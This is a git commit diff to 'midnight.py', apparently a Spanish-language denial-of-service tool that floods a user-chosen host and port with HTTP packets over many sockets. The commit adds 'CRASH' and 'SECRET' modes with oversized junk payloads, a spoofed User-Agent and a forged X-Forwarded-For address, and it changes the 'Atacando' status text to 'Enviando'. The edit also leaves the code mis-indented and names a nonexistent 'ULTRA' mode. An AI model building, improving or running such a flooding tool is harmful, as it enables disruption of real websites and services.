e9c11015188e1cc767b8f9846b36fc922dc3bdbb
SanthM <121729372+SanthM@users.noreply.github.com>
2023-02-02 18:02:49 -0300

    Update midnight.py

--- midnight.py
+++ midnight.py
@@ -20,30 +20,34 @@ def send_http_packets(host, port, num_sockets, message, msg_len, protocol):
             finally:
                 s.close()
         
-        print(Fore.WHITE+str(f"[+] Socket de Tipo {protocol} enviados: {sent_packets}, Atacando..."))
+        print(Fore.WHITE+str(f"[+] Socket de Tipo {protocol} enviados: {sent_packets}, Enviando..."))
         time.sleep(1)
 
 if __name__ == '__main__':
     os.system("clear")
     ascii_text = pyfiglet.figlet_format("Midnight")
     print(colored(ascii_text, 'green'))
-    print(Fore.GREEN+str("Created By Santh'M w/ DevilASN, Beta v.1.5.1"))
+    print(Fore.GREEN+str("Created By Santh'M w/ Genplat, Official Version v1.0"))
     host = input(Fore.GREEN+str("[+] Ingrese la dirección del host (URL o IP): "))
     port = int(input(Fore.GREEN+str("[+] Ingrese el puerto: ")))
     
     num_sockets = int(input(Fore.GREEN+str("[+] Ingrese la cantidad de sockets a enviar: ")))
     
-    protocol = input("Ingrese el protocolo a utilizar (GET o POST): ").upper()
-    if protocol == "GET":
-        message = b'GET / HTTP/1.0\r\n\r\n'
-    elif protocol == "POST":
-        message = b'POST / HTTP/1.0\r\n\r\n'
-    else:
-        print("Protocolo inválido. Debe ser GET o POST.")
-        sys.exit()
-    
-    msg_len = int(input(Fore.GREEN+str("[+] Ingrese la cantidad de bytes a enviar en el mensaje: ")))
-    
-    print("[+] Cargando paquetes...")
-    
-    send_http_packets(host, port, num_sockets, message, msg_len, protocol)
+    protocol = input("Ingrese el protocolo a utilizar (GET, POST, CRASH o SECRET): ").upper()
+if protocol == "GET":
+    message = b'GET / HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
+elif protocol == "POST":
+    message = b'POST / HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
+elif protocol == "CRASH":
+    message = b'"*"*5500\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
+elif protocol == "SECRET":
+    message = b'GET / HTTP/1.0 / POST / HTTP/1.0 / "*"*5500\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
+else:
+    print("Protocolo inválido. Debe ser GET, POST, CRASH O ULTRA.")
+    sys.exit()
+
+msg_len = int(input(Fore.GREEN+str("[+] Ingrese la cantidad de bytes a enviar en el mensaje: ")))
+
+print("[+] Cargando paquetes...")
+
+send_http_packets(host, port, num_sockets, message, msg_len, protocol)
